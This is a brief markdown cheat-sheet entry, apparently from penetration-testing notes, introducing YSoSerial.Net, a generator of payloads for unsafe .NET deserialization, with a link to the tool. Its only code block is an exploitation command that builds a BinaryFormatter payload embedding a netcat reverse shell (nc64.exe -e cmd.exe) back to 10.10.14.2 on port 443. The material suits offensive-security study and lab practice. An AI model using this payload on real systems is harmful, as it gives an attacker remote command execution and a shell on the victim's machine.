# YSoSerial.Net

<details>

<summary>What is it?</summary>

Generates payloads that exploit unsafe .NET object deserialization

[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

</details>

<details>

<summary>Exploitation</summary>

```bash
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "c:\temp\nc64.exe -e cmd.exe 10.10.14.2 443"
```

</details>
